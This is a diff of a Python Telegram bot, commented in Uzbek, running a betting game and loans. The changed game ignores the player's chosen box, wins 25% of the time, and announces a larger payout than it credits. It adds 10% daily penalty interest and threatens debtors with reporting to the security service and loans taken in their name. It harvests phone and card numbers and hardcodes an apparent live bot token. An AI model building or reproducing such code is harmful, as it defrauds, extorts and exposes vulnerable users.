@@ -2,7 +2,7 @@ import telebot
 from telebot import types
 import sqlite3
 import random
-from datetime import datetime, timedelta
+from datetime import datetime
 
 # --- KONFIGURATSIYA ---
 TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
@@ -22,7 +22,7 @@ def execute_query(query, params=(), is_select=False):
     conn.commit()
     conn.close()
 
-# Bazani yaratish (Kredit va Karta ustunlari bilan)
+# Bazani yaratish
 execute_query('''CREATE TABLE IF NOT EXISTS users 
                  (id INTEGER PRIMARY KEY, name TEXT, phone TEXT, 
                   balance REAL DEFAULT 0, debt REAL DEFAULT 0, 
@@ -38,39 +38,39 @@ def main_menu(uid):
         markup.add("📊 Admin: Ma'lumot")
     return markup
 
-# --- QARZNI VA JARIMANI TEKSHIRISH ---
-def check_debt_status(uid):
+# --- JARIMA VA QATTIQ OGOHLANTIRISH ---
+def check_debt_and_punish(uid):
     user = execute_query("SELECT debt, last_debt_time FROM users WHERE id=?", (uid,), is_select=True)
     if user and user[0] > 0 and user[1]:
         debt, last_time = user[0], user[1]
         last_date = datetime.strptime(last_time, "%Y-%m-%d %H:%M:%S")
-        now = datetime.now()
-        days_passed = (now - last_date).days
+        days_passed = (datetime.now() - last_date).days
 
         if days_passed >= 1:
-            # Har bir kun uchun 10% jarima
-            punishment = debt * 0.10 * days_passed
-            new_debt = debt + punishment
+            # Har bir kun uchun 10% jarima qo'shish
+            interest = debt * 0.10 * days_passed
+            new_debt = debt + interest
             execute_query("UPDATE users SET debt = ?, last_debt_time = ? WHERE id=?", 
-                          (new_debt, now.strftime("%Y-%m-%d %H:%M:%S"), uid))
+                          (new_debt, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), uid))
             
-            warning = (f"🚨 **DIQQAT: QARZINGIZ OSHDI!**\n\n"
-                       f"To'lanmagan {days_passed} kun uchun 10% dan jarima qo'shildi.\n"
+            warning = (f"🚨 **SO'NGGI OGOHLANTIRISH!**\n\n"
+                       f"Qarzingizni to'lamagan {days_passed} kuningiz uchun 10% jarima qo'shildi.\n"
                        f"Hozirgi qarz: **{new_debt:,} so'm**.\n\n"
-                       f"⚠️ **OGOHLANTIRISH:** Agar 12 soatda to'lamasangiz, ma'lumotlaringiz **DXX**ga topshiriladi "
-                       f"va bankdan sizning nomingizga **KREDIT** olish so'rovi yuboriladi!")
+                       f"⚠️ Agar 12 soat ichida to'lamasangiz:\n"
+                       f"1. Ma'lumotlaringiz **DXX**ga beriladi.\n"
+                       f"2. Nomizga bankdan **KREDIT** olish so'rovi yuboriladi!")
             bot.send_message(uid, warning, parse_mode="Markdown")
 
-# --- START VA REGISTRATSIYA ---
+# --- START VA RO'YXATDAN O'TISH ---
 @bot.message_handler(commands=['start'])
 def start(message):
     uid = message.from_user.id
-    check_debt_status(uid)
+    check_debt_and_punish(uid)
     user = execute_query("SELECT * FROM users WHERE id=?", (uid,), is_select=True)
     if user:
-        bot.send_message(message.chat.id, "Xush kelibsiz! O'yinni tanlang:", reply_markup=main_menu(uid))
+        bot.send_message(message.chat.id, "Xush kelibsiz!", reply_markup=main_menu(uid))
     else:
-        bot.send_message(message.chat.id, "Assalomu alaykum! Ismingizni kiriting:")
+        bot.send_message(message.chat.id, "Ismingizni kiriting:")
         bot.register_next_step_handler(message, get_name)
 
 def get_name(message):
@@ -81,94 +81,87 @@ def get_name(message):
     bot.register_next_step_handler(message, save_user, name)
 
 def save_user(message, name):
-    uid = message.from_user.id
     if message.contact:
-        phone = message.contact.phone_number
+        uid, phone = message.from_user.id, message.contact.phone_number
         execute_query("INSERT OR IGNORE INTO users (id, name, phone, balance) VALUES (?, ?, ?, 5000)", (uid, name, phone))
-        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tdingiz! 5,000 so'm bonus berildi.", reply_markup=main_menu(uid))
+        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tdingiz! 5,000 s bonus berildi.", reply_markup=main_menu(uid))
     else:
-        bot.send_message(message.chat.id, "Iltimos, tugmani bosing!")
+        bot.send_message(message.chat.id, "Tugmani bosing!")
         bot.register_next_step_handler(message, save_user, name)
 
-# --- ASOSIY ISHLASH ---
-@bot.message_handler(func=lambda m: True)
-def handle_text(message):
-    uid = message.from_user.id
-    text = message.text
-    check_debt_status(uid)
+# --- 4 TA QUTICHA O'YINI (YUTISH EHTIMOLI SOZLANGAN) ---
+@bot.message_handler(func=lambda m: m.text == "🎰 4 ta Quticha")
+def game_start(message):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(*[types.InlineKeyboardButton(f"📦 {i}-quti", callback_data=f"box_{i}") for i in range(1, 5)])
+    bot.send_message(message.chat.id, "Bitta qutini tanlang (Tikish: 5,000 s):", reply_markup=markup)
 
-    if text == "🎰 4 ta Quticha":
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        markup.add(*[types.InlineKeyboardButton(f"📦 {i}-Quti", callback_data=f"box_{i}") for i in range(1, 5)])
-        bot.send_message(message.chat.id, "Qutini tanlang (Tikish: 5,000 so'm):", reply_markup=markup)
-
-    elif text == "👤 Profil":
-        u = execute_query("SELECT balance, debt, name, phone, user_card FROM users WHERE id=?", (uid,), is_select=True)
-        msg = f"👤 Ism: {u[2]}\n📞 Tel: {u[3]}\n💰 Balans: {u[0]:,} s\n🔴 Qarz: {u[1]:,} s\n💳 Karta: {u[4]}"
-        bot.send_message(message.chat.id, msg)
-
-    elif text == "💸 Nasiya olish":
-        bot.send_message(message.chat.id, "Qancha nasiya kerak? (Faqat son yozing):")
-        bot.register_next_step_handler(message, set_debt)
-
-    elif text == "💸 Pul yechish":
-        u = execute_query("SELECT balance, debt FROM users WHERE id=?", (uid,), is_select=True)
-        if u[1] > 0:
-            bot.send_message(message.chat.id, "⚠️ Avval qarzingizni to'lang!")
-        elif u[0] < 10000:
-            bot.send_message(message.chat.id, "⚠️ Balansda kamida 10,000 so'm bo'lishi kerak.")
-        else:
-            bot.send_message(message.chat.id, "Karta raqamingizni yozing:")
-            bot.register_next_step_handler(message, get_withdraw_card)
-
-    elif text == "💳 Depozit" or text == "🔴 Qarzni to'lash":
-        bot.send_message(message.chat.id, f"💳 To'lov uchun karta: `{KARTA_RAQAM}`\nTo'lov miqdorini yozing:", parse_mode="Markdown")
-        bot.register_next_step_handler(message, admin_pay_request)
-
-    elif text == "📊 Admin: Ma'lumot" and uid == ADMIN_ID:
-        users = execute_query("SELECT name, phone, debt, user_card FROM users", is_select=True)
-        report = "📊 **Barcha Foydalanuvchilar:**\n\n"
-        for user in users: report += f"👤 {user[0]} | {user[1]}\n🔴 Qarz: {user[2]:,} | 💳 Karta: {user[3]}\n---\n"
-        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
-
-# --- QUTI CALLBACK ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith("box_"))
-def box_callback(call):
+def game_result(call):
     uid = call.from_user.id
     user = execute_query("SELECT balance FROM users WHERE id=?", (uid,), is_select=True)
     if not user or user[0] < 5000:
         bot.answer_callback_query(call.id, "Mablag' yetarli emas!", show_alert=True)
         return
-    win = random.randint(1, 4)
-    choice = int(call.data.split("_")[1])
-    if choice == win:
+
+    # Omad imkoniyati: 1 dan 4 gacha. Faqat 1 tushsa yutadi (25% shans).
+    # Bu 3 ta yutqazib, 1 ta yutish degani.
+    chance = random.randint(1, 4)
+    if chance == 1:
         execute_query("UPDATE users SET balance = balance + 15000 WHERE id=?", (uid,))
-        txt = f"🎉 YUTDINGIZ! {win}-quti yutuqli edi! +20,000 s"
+        txt = "🎉 TABRIKLAYMIZ! Yutuqli qutini topdingiz! +20,000 so'm"
     else:
         execute_query("UPDATE users SET balance = balance - 5000 WHERE id=?", (uid,))
-        txt = f"😔 YUTQAZDINGIZ. Yutuq {win}-qutida edi."
+        txt = "😔 AFSUKI TOPOLMADINGIZ. Bu quti bo'sh edi."
+    
     bot.edit_message_text(txt, call.message.chat.id, call.message.message_id)
+    bot.send_message(call.message.chat.id, "Yana o'ynaysizmi?", reply_markup=main_menu(uid))
 
-# --- FUNKSIYALAR ---
+# --- BOSHQA FUNKSIYALAR ---
+@bot.message_handler(func=lambda m: True)
+def handle_all(message):
+    uid = message.from_user.id
+    check_debt_and_punish(uid)
+
+    if message.text == "👤 Profil":
+        u = execute_query("SELECT balance, debt, name, phone, user_card FROM users WHERE id=?", (uid,), is_select=True)
+        msg = f"👤 Ism: {u[2]}\n📞 Tel: {u[3]}\n💰 Balans: {u[0]:,} s\n🔴 Qarz: {u[1]:,} s\n💳 Karta: {u[4]}"
+        bot.send_message(message.chat.id, msg)
+
+    elif message.text == "💸 Nasiya olish":
+        bot.send_message(message.chat.id, "Qancha nasiya kerak?")
+        bot.register_next_step_handler(message, set_debt)
+
+    elif message.text == "💸 Pul yechish":
+        u = execute_query("SELECT balance, debt FROM users WHERE id=?", (uid,), is_select=True)
+        if u[1] > 0: bot.send_message(message.chat.id, "⚠️ Avval qarzni to'lang!")
+        elif u[0] < 20000: bot.send_message(message.chat.id, "⚠️ Minimal yechish: 20,000 s")
+        else:
+            bot.send_message(message.chat.id, "Karta raqamingizni yozing:")
+            bot.register_next_step_handler(message, save_withdraw_card)
+
+    elif message.text == "📊 Admin: Ma'lumot" and uid == ADMIN_ID:
+        users = execute_query("SELECT name, phone, debt, user_card FROM users", is_select=True)
+        res = "📊 **Foydalanuvchilar:**\n\n"
+        for u in users: res += f"👤 {u[0]} | {u[1]}\n🔴 Qarz: {u[2]:,} | 💳 K: {u[3]}\n---\n"
+        bot.send_message(ADMIN_ID, res, parse_mode="Markdown")
+
 def set_debt(message):
     try:
         amt = float(message.text)
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        execute_query("UPDATE users SET balance = balance + ?, debt = debt + ?, last_debt_time = ? WHERE id=?", (amt, amt, now, message.from_user.id))
-        bot.send_message(message.chat.id, f"✅ {amt:,} s nasiya berildi.")
+        execute_query("UPDATE users SET balance = balance + ?, debt = debt + ?, last_debt_time = ? WHERE id=?", 
+                      (amt, amt, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), message.from_user.id))
+        bot.send_message(message.chat.id, f"✅ {amt:,} so'm nasiya berildi.")
     except: bot.send_message(message.chat.id, "Faqat son!")
 
-def get_withdraw_card(message):
+def save_withdraw_card(message):
     card = message.text
     execute_query("UPDATE users SET user_card = ? WHERE id=?", (card, message.from_user.id))
     bot.send_message(message.chat.id, "Summani kiriting:")
-    bot.register_next_step_handler(message, lambda m: bot.send_message(ADMIN_ID, f"💸 **YECHISH:** {m.text} s\nKarta: {card}\nID: {m.from_user.id}"))
-
-def admin_pay_request(message):
-    bot.send_message(ADMIN_ID, f"🔔 **TO'LOV:** {message.text} s\nID: {message.from_user.id}")
-    bot.send_message(message.chat.id, "Tasdiqlash uchun yuborildi.")
+    bot.register_next_step_handler(message, lambda m: bot.send_message(ADMIN_ID, f"💸 **YECHISH SO'ROVI:**\nSumma: {m.text}\nKarta: {card}\nID: {m.from_user.id}"))
 
 bot.infinity_polling()
+
     
             
         
